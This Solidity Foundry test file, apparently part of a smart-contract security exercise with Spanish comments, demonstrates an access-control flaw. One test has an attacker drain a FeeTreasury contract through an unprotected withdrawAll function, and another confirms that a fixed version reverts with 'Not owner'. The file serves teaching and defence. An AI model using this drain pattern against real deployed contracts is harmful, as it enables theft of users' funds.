// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test} from "forge-std/Test.sol";
import {FeeTreasury} from "../../src/access-control/target/FeeTreasury.sol";
import {FeeTreasuryFixed} from "../../src/access-control/mitigations/FeeTreasuryFixed.sol";

contract AccessControl01Test is Test {
    FeeTreasury treasury;
    FeeTreasuryFixed treasuryFixed;

    address userA = makeAddr("userA");
    address userB = makeAddr("userB");
    address attacker = makeAddr("attacker");

    function setUp() public {
        treasury = new FeeTreasury();
        treasuryFixed = new FeeTreasuryFixed();

        vm.deal(userA, 5 ether);
        vm.prank(userA);
        treasury.deposit{value: 5 ether}();
        vm.deal(userB, 3 ether);
        vm.prank(userB);
        treasury.deposit{value: 3 ether}();

        vm.deal(userA, 5 ether);
        vm.prank(userA);
        treasuryFixed.deposit{value: 5 ether}();
        vm.deal(userB, 3 ether);
        vm.prank(userB);
        treasuryFixed.deposit{value: 3 ether}();
    }

    /// @dev No hace falta ningún contrato atacante: withdrawAll() no comprueba
    ///      msg.sender, así que cualquier EOA puede llamarla directamente.
    function test_exploit_withdrawAll() public {
        uint256 stolen = address(treasury).balance;
        assertEq(stolen, 8 ether);

        vm.prank(attacker);
        treasury.withdrawAll(payable(attacker));

        assertEq(address(treasury).balance, 0);
        assertEq(attacker.balance, stolen);
    }

    function test_mitigation_blocksWithdrawAll() public {
        assertEq(address(treasuryFixed).balance, 8 ether);

        vm.prank(attacker);
        vm.expectRevert(bytes("Not owner"));
        treasuryFixed.withdrawAll(payable(attacker));

        assertEq(address(treasuryFixed).balance, 8 ether, "el balance no debe moverse");
        assertEq(attacker.balance, 0);
    }
}
